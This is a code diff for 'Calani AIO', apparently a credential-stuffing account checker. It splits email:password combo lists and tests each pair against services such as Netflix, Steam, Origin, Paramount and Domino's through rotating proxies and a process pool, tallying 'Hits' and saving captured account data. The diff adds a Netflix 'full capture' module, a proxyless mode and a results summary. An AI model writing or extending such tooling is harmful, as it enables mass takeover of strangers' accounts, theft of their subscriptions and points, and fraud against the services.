@@ -27,6 +27,7 @@ from modules.checkers import yahoo
 from modules.checkers import dominos
 from modules.checkers import dickeys
 from modules.checkers import hotspot_shield
+from modules.checkers import netflix
 
 modules_list = {
     "bww [points capture | proxyless]":bww,
@@ -43,6 +44,7 @@ modules_list = {
     "uplay [full capture]":uplay,
     "origin [full capture]":origin,
     "steam [full capture]":steam,
+    "netflix [full capture]":netflix,
     "paramount [full capture]":paramount,
     "plextv [subscription capture]":plextv,
     "crunchyroll [subscription capture]":crunchyroll,
@@ -54,7 +56,7 @@ modules_list = {
     "hotspot shield [subscription capture]":hotspot_shield,
 }
 
-def starter(modules_lst:list):
+def starter(selected_modules:list):
     """Starts checking accounts"""
     reset_stats()
     set_title(f"Calani AIO | Getting Ready | {discord_name}")
@@ -62,7 +64,7 @@ def starter(modules_lst:list):
         if ':' in account:
             email,password = account.split(":",1)
             if email and password:
-                for module in modules_lst:
+                for module in selected_modules:
                     modules_list[module].check(email,password)
                     Checker.cpm += 60
                 Checker.remaining.remove(account)
@@ -100,47 +102,65 @@ def starter(modules_lst:list):
 
     print("\n")
 
-    print(f"    [{cyan}>{reset}] Pick Proxy File")
-    file_path = get_file("Proxy File",type="Proxy File")
-    if not file_path:
-        print(f"    [{red}>{reset}] No File Detected")
-        sleep(1)
-        return
-    with open(file_path,errors="ignore") as file:
-        before_proxies = file.read().splitlines()
-        after_proxies = list(set(before_proxies))
-        Checker.proxies = after_proxies
-        Checker.total_proxies = len(Checker.proxies)
-        duplicates = len(before_proxies)-len(after_proxies)
-    if not after_proxies:
-        print(f"    [{red}>{reset}] No Proxies Detected")
-        sleep(1)
-        return
-    print(f"    [{cyan}>{reset}] Imported {green}{len(before_proxies)}{reset} Proxies")
-    if duplicates != 0:
-        print(f"    [{cyan}>{reset}] Removed {green}{duplicates}{reset} Duplicates")
-    sleep(0.5)
+    if Checker.proxy_type != 'none':
+        print(f"    [{cyan}>{reset}] Pick Proxy File")
+        file_path = get_file("Proxy File",type="Proxy File")
+        if not file_path:
+            print(f"    [{red}>{reset}] No File Detected")
+            sleep(1)
+            return
+        with open(file_path,errors="ignore") as file:
+            before_proxies = file.read().splitlines()
+            after_proxies = list(set(before_proxies))
+            Checker.proxies = after_proxies
+            Checker.total_proxies = len(Checker.proxies)
+            duplicates = len(before_proxies)-len(after_proxies)
+        if not after_proxies:
+            print(f"    [{red}>{reset}] No Proxies Detected")
+            sleep(1)
+            return
+        print(f"    [{cyan}>{reset}] Imported {green}{len(before_proxies)}{reset} Proxies")
+        if duplicates != 0:
+            print(f"    [{cyan}>{reset}] Removed {green}{duplicates}{reset} Duplicates")
+        sleep(0.5)
 
     Checker.checking = True
     Checker.time = get_time()
     makedirs(f"Results/{Checker.time}",exist_ok=True)
 
-    Thread(target=title,args=(len(modules_lst),),daemon=True).start()
+    Thread(target=title,args=(len(selected_modules),),daemon=True).start()
     Thread(target=level_cpm,daemon=True).start()
 
     clear()
+    total_modules = len(selected_modules)
     if not Checker.cui:
         ascii()
         print("\n\n")
-    else: Thread(target=cui,args=(len(modules_lst),),daemon=True).start()
+    else: Thread(target=cui,args=(total_modules,),daemon=True).start()
     if Checker.total_proxies > Checker.threads: Checker.lockProxies = True
     mainpool = Pool(processes=Checker.threads)
     mainpool.imap_unordered(func=initializeChecker,iterable=Checker.accounts)
     mainpool.close()
     mainpool.join()
-    sleep(1)
     Checker.checking = False
+    sleep(0.2)
+    clear()
+    ascii()
+    modules_string = '\n    '.join([module.title().split(' ')[0] for module in selected_modules])
+    print(f"""
+            
+    [{cyan}{total_modules} Modules{reset}]
+    {cyan}
+    {modules_string}
+    {reset}
+
+    {'Hits'.center(11,' ')}{fg(8)}-{reset}  {fg(2)}{numerize(Checker.good)}{reset}
+    {'Custom'.center(11,' ')}{fg(8)}-{reset}  {fg(3)}{numerize(Checker.custom)}{reset}
+    {'Bad'.center(11,' ')}{fg(8)}-{reset}  {fg(1)}{numerize(Checker.bad)}{reset}
+
+    """)
+    save_path = os.path.join(os.getcwd(),f'Results\\{Checker.time}')
     print("\n\n")
     print(f"    [{cyan}>{reset}] Finished Checking")
-    print(f"    [{cyan}>{reset}] Saved to Results/{Checker.time}")
+    print(f"    [{cyan}>{reset}] Saved to \"{save_path}\"")
     input(f"    [{cyan}>{reset}] Press Enter To Go Back")
